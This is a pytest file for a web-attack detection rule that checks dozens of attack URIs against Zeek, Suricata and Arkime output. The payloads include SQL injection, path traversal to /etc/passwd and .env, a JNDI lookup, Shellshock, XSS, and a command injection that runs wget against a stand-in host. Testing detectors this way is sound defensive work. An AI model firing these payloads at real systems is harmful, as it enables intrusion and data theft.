    used = {*wa.WebAttacks.attack, *wa.WebLoginBurst.attack, *(technique for _name, _marker, technique in wa._TOOLS)}
    assert used <= current
    assert {"T1190", "T1595.002", "T1110"} <= used


def test_every_tool_marker_has_a_recorded_source():
    sources = json.loads((ROOT / "content" / "network" / "web_attacks_sources.json").read_text(encoding="utf-8"))
    recorded = {name for source in sources["sources"] for name in source.get("markers", [])}
    assert {name for name, _marker, _technique in wa._TOOLS} <= recorded
    assert sources["thresholds"]["pair_leads_per_endpoint"] == wa.PAIR_LEADS
    assert sources["thresholds"]["total_text_characters"] == wa.MAX_RECORD_TEXT
    assert "values_per_record" not in sources["thresholds"]


# ---- grammar additions, each with its lookalikes ---------------------------------------------------------------------

GRAMMAR_ADDITIONS = [
    ("sql_injection", "/item?id=1+or+1=1"),
    ("sql_injection", "/item?id=1+AND+4321=4321"),
    ("sql_injection", "/item?id=1)%20AND%205633=5633%20AND%20(8=8"),
    ("sql_injection", "/login.php?user=admin'--+&pass=x"),
    ("sql_injection", "/login.php?user=admin'%23&pass=x"),
    ("sql_injection", "/item?id=1'+order+by+5--+"),
    ("sql_injection", "/item?id=1';waitfor+delay+'0:0:5'--"),
    ("sql_injection", "/item?id=1+and+(select+count(*)+from+information_schema.tables)>0"),
    ("sql_injection", "/item?id=1%20AND%20EXTRACTVALUE(1,CONCAT(0x5c,(SELECT%20USER())))"),
    ("sql_injection", "/item?id=1+/*!50000union*/+/*!50000select*/+1,2"),
    ("sql_injection", "/item?id=1+union+select+'a','b'"),
    ("sql_injection", "/item?id=1;drop+table+users"),
    ("sql_injection", "/item?id=1'+and+sleep(5)--+"),
    ("sql_injection", "/item?id=1');insert+into+users+values('a','b')--+"),
    ("path_traversal_lfi", "/fi/?page=php://filter/convert.base64-encode/resource=index.php"),
    ("path_traversal_lfi", "/fi/?page=/etc/passwd%00"),
    ("path_traversal_lfi", "/fi/?page=c:\\boot.ini"),
    ("path_traversal_lfi", "/.env"),
    ("path_traversal_lfi", "/app/.git/config"),
    ("path_traversal_lfi", "/fi/?page=/etc/hosts"),
    ("path_traversal_lfi", "/fi/?page=....//....//....//etc/passwd"),
    ("path_traversal_lfi", "/app/..;/manager/html"),
    ("path_traversal_lfi", "/view?f=../wp-config.php"),
    ("path_traversal_lfi", "/view?f=../../../logs/app.txt"),
    ("template_injection", "/?x=${jndi:ldap://192.0.2.66:1389/a}"),
    ("template_injection", "/hello?name=%23{7*7}"),
    ("template_injection", "/hello?name={{7*'7'}}"),
    ("template_injection", "/hello?name={{config}}"),
    ("template_injection", "/hello?name=<%25=+7*7+%25>"),
    ("command_injection", "/exec/?ip=127.0.0.1;ls+-la"),
    ("command_injection", "/exec/?ip=127.0.0.1;ls"),
    ("command_injection", "/exec/?ip=127.0.0.1|dir"),
    ("command_injection", "/exec/?ip=127.0.0.1;sleep+10"),
    ("command_injection", "/exec/?ip=$(whoami)"),
    ("command_injection", "/exec/?ip=$(busybox+wget+http://192.0.2.9/x)"),
    ("command_injection", "/exec/?ip=127.0.0.1%26ping+-c+5+10.0.0.1&Submit=Submit"),
    ("command_injection", "/exec/?ip=127.0.0.1%0aid"),
    ("command_injection", "/cgi-bin/test.cgi?x=()+{+:;+};+/bin/bash+-c+'id'"),
    ("cross_site_scripting", "/s?q=<details+open+ontoggle=alert(1)>"),
    ("cross_site_scripting", "/s?q=\"+onmouseover=\"alert(1)"),
    ("cross_site_scripting", "/s?q=<marquee+onstart=alert(1)>"),
]


@pytest.mark.parametrize("sensor", ["zeek", "suricata", "arkime"])
@pytest.mark.parametrize("attack_class,uri", GRAMMAR_ADDITIONS)
def test_grammar_additions_match_on_every_sensor(sensor, attack_class, uri):
    assert attack_class in classes_of([on_each_sensor(uri)[sensor]])[0]


BENIGN_LOOKALIKES = [
    # quoted phrases and interface strings that start with an SQL verb
    "/search?q=%22select+committee%22+hearing", "/search?q=%22update+on+the+project%22",
    "/search?q=%22delete+account%22+facebook", "/search?q=%22drop+shipping%22+suppliers",
    "/search?q=%22union+square%22+restaurants", "/search?q='insert+coin'+arcade",
    "/api?i18n=%7B%22label%22%3A%20%22Select%20a%20country%22%2C%20%22cta%22%3A%20%22Update%20profile%22%7D",
    "/api?e=%7B%22event%22%3A%20%22click%22%2C%20%22text%22%3A%20%22Delete%20this%20item%3F%22%7D",
    "/api?state=%7B%22title%22%3A%20%22Update%20available%22%2C%20%22body%22%3A%20%22Insert%20coin%22%7D",
    "/graphql?query=mutation%7BupdateUser%28id%3A%225%22%2Cname%3A%22select%20all%22%29%7Bid%7D%7D",
    # SQL words in prose and searches
    "/search?q=how+to+select+and+union+tables+in+sql", "/search?q=sql+union+select+example",
    "/search?q=union+select+distinct+tutorial", "/search?q=select+*+from+users", "/docs/sql/union-select.html",
    "/search?q=rock+'n'+roll+and+1+>+0", "/search?q=O'Reilly+and+5+=+five", "/search?q=it's+5+or+6+=+11",
    "/search?q=sleep(8)+hours", "/search?q=benchmark+(3dmark)", "/search?q=order+by+price", "/q?a=1+or+2",
    "/search?q=information_schema+tutorial", "/q?a='x'&quote=select+one", "/search?q=waitfor+the+delay",
    "/shop?sort=price&order=5", "/search?q=5+or+5+=+10",
    # delimiter lists
    "/api?fields=name;id", "/api?cols=name|id|date", "/w/api.php?action=query&titles=Dog|Cat|Bird&prop=info",
    "/w/api.php?action=query&titles=PHP|Perl|Python", "/chart?chl=Dog|Cat&chd=t:60,40", "/api?ext=html|php",
    "/api?lang=en;sh", "/api?tags=dog;cat;bird", "/x;jsessionid=ABCDEF?id=5", "/api?sort=name;id",
    "/q?types=jsp|php|asp", "/q?text=line+one%0D%0Aping+me+later", "/q?a=1&&id=5", "/q?a=1&id=5&type=2",
    "/q?cmd=help", "/q?list=curl,wget,nc", "/docs/bash/cat.html", "/q?page=3;more", "/q?n=5;head", "/q?v=2;sh",
    "/q?size=10|sort", "/q?a=1;type=2",
    # markdown and HTML that carries no handler
    "/preview?md=Use+%60id%60+to+show+your+uid", "/preview?md=%60code%60+and+**bold**",
    "/preview?html=%3Cb%3Ehello%3C%2Fb%3E%3Cbr%3E%3Ca+href%3D%22https%3A%2F%2Fa.test%22%3Elink%3C%2Fa%3E",
    "/preview?html=%3Cimg+src%3D%22a.png%22+alt%3D%22x%22%3E", "/preview?html=%3Cinput+type%3Dtext+name%3Dq%3E",
    "/preview?html=%3Ca+href%3D%22https%3A%2F%2Fa.test%2F%3Fonline%3D1%22%3Ex%3C%2Fa%3E", "/share?text=I+%3C3+this",
    "/q?title=%22x%22+onboarding=%22true%22",
    # relative references and in-root navigation
    "/redirect?next=../home", "/thumb.php?src=../uploads/a.jpg", "/dl?file=../docs/readme.txt",
    "/page?return=..%2F..%2Faccount", "/x?css=../theme/x.css", "/static/css/../img/logo.png", "/a/b/../../c.js",
    "/q?range=1..5", "/q?back=../..",
    # placeholders, dates and ranges
    "/t?d={{2024-01-15}}", "/t?d={{2024/01/15}}", "/t?name={{customer_name}}", "/t?u=${USER_ID}",
    "/t?range=${start}-${end}", "/ad?cb=${CACHEBUSTER}&w=${WIDTH}x${HEIGHT}", "/t?expr={{price*2}}",
    "/t?x={{items.length-1}}", "/t?v=#{version}",
    # names that only resemble a sensitive file
    "/static/.env-sample", "/docs/.environment", "/blog/etc/hostsfile", "/kb/boot.ini.html", "/git/config.html",
    "/q?scheme=php", "/q?u=phpinfo", "/app/.well-known/security.txt",
]


@pytest.mark.parametrize("uri", BENIGN_LOOKALIKES)
def test_benign_lookalikes_of_the_grammars_do_not_match(attack_rule, uri):
    assert finish(attack_rule, [zeek(uri)]) == []
    assert attack_rule.capped == 0


def test_a_versioned_comment_keeps_its_keyword_and_a_plain_comment_does_not():
    assert wa._sql("1 /*!50000union*/ /*!select*/ 1,2")
    assert wa._sql("1 union/**/select/*x*/1")
    assert not wa._sql("1 /*union select 1,2*/")


# ---- state refusal, partial inspection and work bounds ---------------------------------------------------------------

def test_a_refused_fold_reports_each_pair_once(attack_rule, tmp_path):
    from romulus.detect.bounded import StateBudget

    attack_rule.budget = StateBudget(tmp_path, disk_total=8 * 2**20, reserve=0)
    list(attack_rule.consume([event(PATH)]))
    attack_rule.budget.force_full("synthetic refusal", lambda account: True)
    refused = []
    for offset in range(0, 2000, 256):
        refused += list(attack_rule.consume([event(PATH, n=n + 1) for n in range(offset, min(offset + 256, 2000))]))
    assert len(refused) == 1 and refused[0].proposed_lane == "lead"
    assert refused[0].claim.startswith("At least 1 ")
    assert attack_rule.capped == 2000                                # every refused record is counted
    assert any("fold is incomplete" in reason for reason in attack_rule.limit_reasons())


def test_pairs_beyond_the_live_refusal_list_share_one_lead_per_class(attack_rule, tmp_path, monkeypatch):
    from romulus.detect.bounded import StateBudget

    monkeypatch.setattr(wa, "REFUSED_GROUPS", 4)
    attack_rule.budget = StateBudget(tmp_path, disk_total=8 * 2**20, reserve=0)
    attack_rule._db()
    attack_rule.budget.force_full("synthetic refusal", lambda account: True)
    rows = [event(uri, n=2 * s + k, source=f"198.51.100.{s + 1}") for s in range(50) for k, uri in enumerate((PATH, SQL))]
    refused = list(attack_rule.consume(rows))
    keys = [match.group_key for match in refused]
    assert len(keys) == len(set(keys)) == 4 + 2
    assert {"unfolded|path_traversal_lfi", "unfolded|sql_injection"} <= set(keys)
    assert all(match.proposed_lane == "lead" and match.events for match in refused)
    assert attack_rule.capped == 100


def test_a_partly_inspected_record_does_not_qualify_later_claims(attack_rule):
    # one oversize request from one source, then an ordinary one from another
    rows = [event("/x?id=1'+or+'1'='1&pad=" + "a" * 17000, source="192.0.2.50"), event(PATH, n=1)]
    _live, final = published(attack_rule, rows)
    clean = final["192.0.2.8|10.2.3.4|path_traversal_lfi"]
    assert not clean.claim.startswith("At least") and clean.aggregate_summary["count_complete"] == 1
    assert not any("partly inspected" in note or "lower bounds" in note for note in clean.notes)
    partial = final["192.0.2.50|10.2.3.4|sql_injection"]
    assert not partial.claim.startswith("At least") and partial.aggregate_summary["count_complete"] == 0
    assert any("1 of the counted record(s) were only partly inspected" in note for note in partial.notes)


def test_a_reader_that_stops_early_loses_nothing_already_inspected(attack_rule):
    rows = [event(PATH, n=s, source=f"198.51.100.{s + 1}") for s in range(3)]
    reader = attack_rule.consume(rows)
    reader.close()                                                   # nothing was requested
    reader = attack_rule.consume(iter(rows))
    next(reader)
    reader.close()
    assert len(list(attack_rule.finalize())) == 3


PATHOLOGICAL = {
    "quote runs": "' " * 8192, "quote or runs": ("'" + " " * 16 + "or" + " " * 16) * 470,
    "union runs": "union select " * 1260, "tag runs": "<a " * 5461, "handler runs": ("<img " + "onabc =" * 72) * 32,
    "remote url runs": "?page=http://" * 1260, "template opener runs": ("{{" + "_" * 128) * 126,
    "dunder runs": ("${" + "__a" * 42) * 128, "separator runs": ";|`&&$(" * 2340, "dot runs": "../" * 5461,
    "parameter runs": "&a=.." * 3276, "comment runs": "/*" * 8192, "entity runs": "&lt;" * 4096,
    "escape runs": "%25" * 5461, "overlong runs": "%c0%af" * 2730, "credential runs": "&password=" * 1638,
}


@pytest.mark.parametrize("name", PATHOLOGICAL)
def test_every_grammar_is_bounded_on_a_pathological_value(name):
    text = PATHOLOGICAL[name][:wa.MAX_URI]
    began = time.perf_counter()
    decoded, _issues, _evasive = wa._decode(text, wa.MAX_URI)
    wa._classes(decoded, own=frozenset({"10.0.0.1"}), session=True)
    wa._agent_classes(decoded[:wa.MAX_UA])
    wa._redact_uri(text)
    # measured worst case is a few hundredths of a second; the bound only has to catch runaway backtracking
    assert time.perf_counter() - began < 2.0


def test_the_spill_holds_what_the_fold_needs_and_nothing_readable_as_a_secret(attack_rule):
    list(attack_rule.consume([event("/MARKER/../../../etc/passwd?j_password=TOPSECRET")]))
    attack_rule._spill.db.commit()
    with sqlite3.connect(attack_rule._spill.path) as database:
        blobs = [value for row in database.execute("SELECT first_event FROM web_groups") for value in row]
    assert blobs and b"MARKER" not in blobs[0]                       # compressed: a byte search proves nothing
    text = str(expand_event(blobs[0]))
    assert "MARKER" in text and "TOPSECRET" not in text
